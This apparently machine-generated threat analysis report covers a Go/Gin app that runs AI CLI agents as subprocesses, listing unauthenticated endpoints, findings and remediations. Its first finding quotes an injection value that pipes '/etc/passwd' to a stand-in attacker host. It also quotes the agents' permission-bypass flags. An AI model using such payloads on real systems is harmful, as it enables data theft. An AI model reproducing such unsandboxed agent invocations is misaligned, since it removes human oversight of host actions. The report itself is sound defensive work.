# Threat Analysis Report

Generated: 2026-03-20
Codebase: agents-auction-house
Overall Risk Score: 3/10
Total Endpoints: 5
Protected Endpoints: 0
Unprotected Endpoints: 5

## Attack Surface Diagram

```
                          INTERNET
                             |
                  +----------+----------+
                  |   Vite Dev Proxy    |
                  |  :5173 -> :3000     |
                  +----------+----------+
                             |
                  +----------+----------+
                  |   Gin HTTP Server   |
                  |   :3000 (0.0.0.0)   |
                  |   CORS: localhost    |
                  +----------+----------+
                             |
       +----------+----------+----------+----------+
       |          |          |          |          |
  +----+----+ +---+----+ +--+-----+ +--+-----+ +--+-----+
  |POST     | |GET     | |GET     | |GET     | |GET     |
  |/api/    | |/api/   | |/api/   | |/api/   | |/api/   |
  |auctions | |auctions| |auctions| |auctions| |agents  |
  |[OPEN!]  | |[OPEN!] | |/:id   | |/:id/   | |[OPEN!] |
  +---------+ +--------+ |[OPEN!] | |stream  | +--------+
                          +--------+ |[OPEN!] |
                                     +---+----+
                                         |
                                     SSE Stream
                                         |
       +----------+----------+----------+
       |          |          |          |
  +----+----+ +---+----+ +--+-----+ +--+-----+
  | claude  | | gemini | | copilot| | codex  |
  | CLI     | | CLI    | | CLI    | | CLI    |
  | exec()  | | exec() | | exec() | | exec() |
  +---------+ +--------+ +--------+ +--------+
       |
  +----+----+
  | SQLite  |
  | auction |
  | .db     |
  +---------+
```

## Data Flow Diagram

```
POST /api/auctions
  |
  v
User JSON Body --> [Gin ShouldBindJSON] --> [Validation: len==3] --> [UUID Gen] --> [SQLite INSERT]
                         ^                        ^                                      |
                         |                        |                                      v
                    Type checking            Basic check only                    go engine.RunAuction()
                    (struct binding)         (no auth, no rate limit)                     |
                                                                                         v
                                                                              [Build Prompt String]
                                                                                         |
                                                                                         v
                                                                              [exec.Command(CLI, prompt)]
                                                                                    ^
                                                                                    |
                                                                               COMMAND INJECTION
                                                                               RISK: prompt flows
                                                                               into shell args


GET /api/auctions/:id/stream
  |
  v
Path Param "id" --> [SSE Subscribe] --> [Broadcast channel] --> [Stream to client]
                         ^
                         |
                    No validation that
                    auction ID exists
                    before subscribing
```

## Executive Summary

This is a Go/Gin backend with React frontend that runs AI agent auctions via CLI subprocess calls. The attack surface consists of 5 unauthenticated HTTP endpoints with no rate limiting, no authentication, and no authorization. The most critical risk is command injection through agent prompt construction that flows into `exec.Command` with user-influenced data. The application also exposes internal error messages to clients and has an overly permissive SSE CORS header (`Access-Control-Allow-Origin: *`).

## Attack Surface Inventory

### Endpoints

| # | Method | Path | Auth | Rate Limited | Input Types | Score | OWASP |
|---|--------|------|------|-------------|-------------|-------|-------|
| 1 | POST | /api/auctions | None | No | JSON body | 2/10 | A01, A03, A07 |
| 2 | GET | /api/auctions | None | No | None | 5/10 | A01, A07 |
| 3 | GET | /api/auctions/:id | None | No | Path param | 4/10 | A01, A07 |
| 4 | GET | /api/auctions/:id/stream | None | No | Path param | 3/10 | A01, A05, A07 |
| 5 | GET | /api/agents | None | No | None | 6/10 | A01, A07 |

### Input Channels

| # | Type | Location (file:line) | Validated | Sanitized | Flows To | Score |
|---|------|---------------------|-----------|-----------|----------|-------|
| 1 | JSON body (agents array) | backend/handlers/auction.go:17 | Partial (struct binding + len check) | No | DB insert, CLI exec | 2/10 |
| 2 | Path param (:id) | backend/handlers/auction.go:65 | No | No | DB query (parameterized) | 5/10 |
| 3 | Path param (:id) | backend/handlers/stream.go:12 | No | No | SSE subscription map key | 4/10 |
| 4 | Agent name (from JSON) | backend/agents/registry.go:15 | Partial (switch/case) | No | exec.Command arg | 3/10 |
| 5 | Agent model (from JSON) | backend/agents/claude.go:9 | No | No | exec.Command arg | 1/10 |
| 6 | Agent budget (from JSON) | backend/handlers/auction.go:39 | Partial (default if <=0) | No | In-memory map | 5/10 |

### Authentication Boundaries

| # | Mechanism | Type | Scope | Strength | Gaps Found |
|---|-----------|------|-------|----------|------------|
| 1 | None | N/A | All endpoints | 0/10 | No authentication on any endpoint |

## Threat Details

### 1. Command Injection via Agent Model Parameter - Score: 1/10 [CRITICAL]

**Location:** `backend/agents/claude.go:10`, `backend/agents/copilot.go:9`, `backend/agents/codex.go:9`
**OWASP Category:** A03 - Injection
**Attack Scenario:**
An attacker sends a POST to `/api/auctions` with a crafted `model` field like `opus; curl attacker.com/exfil?data=$(cat /etc/passwd)`. The model string is passed directly as an argument to `exec.Command`. While Go's `exec.Command` does not invoke a shell by default (arguments are passed directly to the process), certain CLI tools may interpret special characters in arguments. More critically, the model value is completely unvalidated and could cause unexpected behavior in the target CLI tools.

**Evidence:**
```go
func (b *ClaudeBuilder) BuildCommand(prompt string) *exec.Cmd {
	return exec.Command("claude", "-p", prompt, "--model", b.Model, "--dangerously-skip-permissions")
}
```

**Current Protections:**
- Go's `exec.Command` passes args directly (no shell interpretation)
- Agent name is validated via switch/case in `registry.go:17`

**Remediation:**
1. Validate the `model` field against an allowlist of known valid models per agent in `registry.go` before passing to builders
2. Add strict regex validation (alphanumeric, dots, hyphens only) for model strings

**Priority:** P0

---

### 2. No Authentication on Any Endpoint - Score: 1/10 [CRITICAL]

**Location:** `backend/router/router.go:9-16`
**OWASP Category:** A07 - Authentication Failures
**Attack Scenario:**
Any network-reachable client can create auctions, which triggers expensive AI API calls (Claude, Gemini, Copilot, Codex). An attacker could automate auction creation to exhaust API quotas, incur significant billing costs, or abuse the system as a proxy to interact with AI services.

**Evidence:**
```go
func Setup(r *gin.Engine) {
	api := r.Group("/api")
	api.POST("/auctions", handlers.CreateAuction)
	api.GET("/auctions", handlers.ListAuctions)
	api.GET("/auctions/:id", handlers.GetAuction)
	api.GET("/auctions/:id/stream", handlers.StreamAuction)
	api.GET("/agents", handlers.ListAgents)
}
```

**Current Protections:**
- CORS restricts browser-based cross-origin requests to localhost ports only

**Remediation:**
1. Add authentication middleware (API key, JWT, or session-based) to at least the POST endpoint
2. Add rate limiting middleware (e.g., `gin-contrib/ratelimit`) to prevent abuse

**Priority:** P0

---

### 3. No Rate Limiting - Score: 2/10 [CRITICAL]

**Location:** `backend/main.go:18-30`
**OWASP Category:** A04 - Insecure Design
**Attack Scenario:**
An attacker sends hundreds of POST requests to `/api/auctions`, each spawning 3 concurrent CLI subprocesses (up to 9+ AI API calls per auction). This could exhaust system resources (CPU, memory, file descriptors), crash the server, and generate massive API billing charges.

**Evidence:**
```go
r := gin.Default()
r.Use(cors.New(cors.Config{...}))
router.Setup(r)
r.Run(":3000")
```

**Current Protections:**
- None detected

**Remediation:**
1. Add rate limiting middleware to the POST /api/auctions endpoint (e.g., 1 request per 30 seconds per IP)
2. Add a global concurrent auction limit to prevent resource exhaustion in `engine.RunAuction`

**Priority:** P0

---

### 4. Internal Error Messages Exposed to Clients - Score: 3/10 [HIGH]

**Location:** `backend/handlers/auction.go:18`, `backend/handlers/auction.go:33`, `backend/handlers/history.go:16`
**OWASP Category:** A05 - Security Misconfiguration
**Attack Scenario:**
Error responses include raw Go error messages (`err.Error()`) which may leak internal implementation details such as SQL error messages, file paths, or database structure to attackers performing reconnaissance.

**Evidence:**
```go
if err := c.ShouldBindJSON(&req); err != nil {
    c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
    return
}
```
```go
if err := persistence.CreateAuction(&auction); err != nil {
    c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
    return
}
```

**Current Protections:**
- None detected

**Remediation:**
1. Return generic error messages to clients (e.g., "internal server error") and log detailed errors server-side only
2. Use a custom error handler middleware that sanitizes error output

**Priority:** P1

---

### 5. SSE Endpoint CORS Wildcard Override - Score: 3/10 [HIGH]

**Location:** `backend/handlers/stream.go:17`
**OWASP Category:** A05 - Security Misconfiguration
**Attack Scenario:**
The SSE stream handler sets `Access-Control-Allow-Origin: *` directly on the response, overriding the restrictive CORS policy configured in `main.go`. Any website can establish an SSE connection to stream auction data in real-time from a user's browser.

**Evidence:**
```go
c.Header("Access-Control-Allow-Origin", "*")
```

**Current Protections:**
- Main CORS config restricts to localhost ports (but this header overrides it for this endpoint)

**Remediation:**
1. Remove the hardcoded `Access-Control-Allow-Origin: *` header from `stream.go:17`
2. Rely on the global CORS middleware configured in `main.go` instead

**Priority:** P1

---

### 6. Unvalidated Agent Name Could Bypass Switch Default - Score: 3/10 [HIGH]

**Location:** `backend/agents/registry.go:15-30`, `backend/handlers/auction.go:38`
**OWASP Category:** A04 - Insecure Design
**Attack Scenario:**
If an attacker sends an agent name not matching the switch cases in `GetRunner`, it returns `nil`. The `engine.RunAuction` function at `auction.go:111` calls `runner.Run(prompt)` without nil-checking, causing a nil pointer dereference panic that crashes the goroutine and leaves the auction in an incomplete state in the database.

**Evidence:**
```go
func GetRunner(name string, model string) *AgentRunner {
	var builder CLIBuilder
	switch name {
	case "claude":
		builder = &ClaudeBuilder{Model: model}
	// ...
	default:
		return nil
	}
	return &AgentRunner{Name: name, Model: model, Builder: builder}
}
```

**Current Protections:**
- Agent name is matched via switch/case (but nil return is not handled by caller)

**Remediation:**
1. Validate agent names against the known list in `CreateAuction` handler before creating the auction
2. Add nil check for the runner in `engine/auction.go:111` before calling `Run`

**Priority:** P1

---

### 7. CLI Tools Run with Elevated Permissions - Score: 2/10 [HIGH]

**Location:** `backend/agents/claude.go:10`, `backend/agents/copilot.go:9`, `backend/agents/codex.go:9`
**OWASP Category:** A04 - Insecure Design
**Attack Scenario:**
The CLI commands are invoked with permission-bypassing flags (`--dangerously-skip-permissions` for claude, `--allow-all` for copilot, `--full-auto` for codex). While the prompt is controlled by the server, a prompt injection attack through crafted agent names or model names could potentially cause these AI tools to execute arbitrary actions on the host system with full permissions.

**Evidence:**
```go
return exec.Command("claude", "-p", prompt, "--model", b.Model, "--dangerously-skip-permissions")
```
```go
return exec.Command("copilot", "--allow-all", "--model", b.Model, "-p", prompt)
```
```go
return exec.Command("codex", "exec", "--full-auto", "-m", b.Model, prompt)
```

**Current Protections:**
- 20-second timeout on command execution (`runner.go:20`)
- Prompt content is server-generated (not directly user-controlled text)

**Remediation:**
1. Run CLI tools in sandboxed environments (containers, restricted user accounts) to limit blast radius
2. Consider using API clients instead of CLI tools to avoid granting full system access
3. Validate and sanitize all values that flow into prompt construction

**Priority:** P0

---

### 8. SQLite Database File Accessible from Working Directory - Score: 4/10 [MEDIUM]

**Location:** `backend/persistence/db.go:16`
**OWASP Category:** A05 - Security Misconfiguration
**Attack Scenario:**
The SQLite database is stored as `./auction.db` in the working directory. If the web server or any other file-serving component has directory traversal vulnerabilities, the database could be downloaded directly. The database contains all auction data, agent configurations, raw AI outputs, and bidding history.

**Evidence:**
```go
DB, err = sql.Open("sqlite3", "./auction.db?_journal_mode=WAL")
```

**Current Protections:**
- Gin does not serve static files from the backend directory by default
- Database queries use parameterized statements (no SQL injection)

**Remediation:**
1. Store the database in a non-web-accessible directory (e.g., `/var/data/auction.db` or configured via environment variable)
2. Ensure file permissions restrict access to the application user only

**Priority:** P2

---

### 9. Unbounded SSE Channel Subscription - Score: 4/10 [MEDIUM]

**Location:** `backend/sse/broadcaster.go:19-25`
**OWASP Category:** A04 - Insecure Design
**Attack Scenario:**
An attacker can open thousands of SSE connections to arbitrary auction IDs (including non-existent ones), each creating a buffered channel of size 100. This consumes memory and goroutines without any limit, potentially leading to denial of service.

**Evidence:**
```go
func (b *Broadcaster) Subscribe(auctionID string) chan string {
	b.mu.Lock()
	defer b.mu.Unlock()
	ch := make(chan string, 100)
	b.channels[auctionID] = append(b.channels[auctionID], ch)
	return ch
}
```

**Current Protections:**
- Channel has buffer of 100 (prevents goroutine blocking)
- Messages are dropped if channel is full (non-blocking send in `Send`)

**Remediation:**
1. Validate that the auction ID exists before allowing subscription
2. Limit the number of concurrent SSE connections per auction and globally
3. Add a connection timeout for idle SSE streams

**Priority:** P2

---

### 10. Raw AI Output Stored and Potentially Exposed - Score: 5/10 [MEDIUM]

**Location:** `backend/persistence/db.go:97`, `backend/models/models.go:43`
**OWASP Category:** A08 - Data Integrity Failures
**Attack Scenario:**
Raw output from AI CLI tools is stored in the database (`raw_output` field) and returned via the GET `/api/auctions/:id` endpoint. This output could contain unexpected content including error messages with system paths, environment variable values, or other sensitive information leaked by the AI tools.

**Evidence:**
```go
"INSERT INTO bids (..., raw_output, ...) VALUES (..., ?, ...)",
    ..., bid.RawOutput, ...
```

**Current Protections:**
- Parameterized SQL prevents injection of raw output into queries

**Remediation:**
1. Sanitize or truncate raw output before storage
2. Consider not exposing `raw_output` in the public API response (use a separate admin endpoint if needed)

**Priority:** P2

---

### 11. Server Logs May Contain Sensitive AI Output - Score: 5/10 [LOW]

**Location:** `backend/engine/auction.go:114`, `backend/engine/bidding.go:32`
**OWASP Category:** A09 - Logging & Monitoring Failures
**Attack Scenario:**
Agent errors and unparseable outputs are logged with `log.Printf`, which includes the full raw output from AI CLI tools. In a production environment, these logs could contain sensitive data and would be accessible to anyone with log access.

**Evidence:**
```go
log.Printf("Agent %s error: %v, output: %s", agentName, err, rawOutput)
```
```go
log.Printf("Failed to parse bid from output: %s", cleaned)
```

**Current Protections:**
- Logging is local (stdout) only

**Remediation:**
1. Truncate raw output in log messages to a reasonable length
2. Implement structured logging with sensitivity levels

**Priority:** P3

## Protection Scorecard

| Category | Score | Status |
|----------|-------|--------|
| Input Validation | 3/10 | EXPOSED |
| Authentication | 0/10 | EXPOSED |
| Authorization | 0/10 | EXPOSED |
| Injection Prevention | 4/10 | PARTIAL |
| Cryptography | N/A | N/A (no crypto operations) |
| Error Handling | 3/10 | EXPOSED |
| Logging & Monitoring | 4/10 | PARTIAL |
| CORS & Headers | 4/10 | PARTIAL |
| Rate Limiting | 0/10 | EXPOSED |
| **Overall** | **3/10** | **EXPOSED** |

## Action Plan

### Immediate (P0) - Fix before next deploy
1. Validate `model` field against allowlist per agent in `backend/handlers/auction.go` before creating auction
2. Validate `name` field against known agent names (`claude`, `gemini`, `copilot`, `codex`) in `backend/handlers/auction.go`
3. Add rate limiting middleware to POST `/api/auctions` endpoint in `backend/main.go`
4. Add concurrent auction limit in `backend/engine/auction.go`
5. Consider sandboxing CLI subprocess execution or switching to API clients in `backend/agents/`

### Short Term (P1) - Fix within 1 sprint
1. Remove hardcoded `Access-Control-Allow-Origin: *` from `backend/handlers/stream.go:17`
2. Replace raw `err.Error()` responses with generic messages in `backend/handlers/auction.go:18,33` and `backend/handlers/history.go:16`
3. Add nil-check for runner in `backend/engine/auction.go:111` before calling `Run`
4. Add authentication middleware (at minimum API key) for the POST endpoint

### Medium Term (P2) - Fix within 1 month
1. Move SQLite database to a non-web-accessible path, configured via environment variable
2. Validate auction ID exists before allowing SSE subscription in `backend/handlers/stream.go`
3. Add connection limits to SSE broadcaster in `backend/sse/broadcaster.go`
4. Remove or restrict `raw_output` field from public API responses

### Long Term (P3) - Backlog
1. Truncate raw AI output in log messages in `backend/engine/auction.go:114` and `backend/engine/bidding.go:32`
2. Implement structured logging with log levels
3. Add request/response audit logging for all endpoints
4. Add health check and monitoring endpoints

## Appendix

### Scanned Files
- 16 .go files (backend)
- 17 .ts/.tsx files (frontend/src)
- 1 .html file (frontend/index.html)
- 3 .sh files (run.sh, stop.sh, test.sh)
- 1 vite.config.ts

### Scan Methodology
- Static analysis of source code, configuration, and infrastructure files
- Pattern matching for known vulnerable patterns
- Code context analysis for confirmation
- OWASP Top 10 2021 classification
- Protection scoring based on 8 criteria (validation, auth, rate limiting, error handling, parameterized queries, TLS, CORS, logging)

### Limitations
- Static analysis only - does not detect runtime vulnerabilities
- Does not scan third-party dependency CVEs
- Pattern-based detection may miss custom frameworks
- Environment-variable-dependent security controls cannot be verified
- CLI tool behavior with crafted arguments not tested dynamically
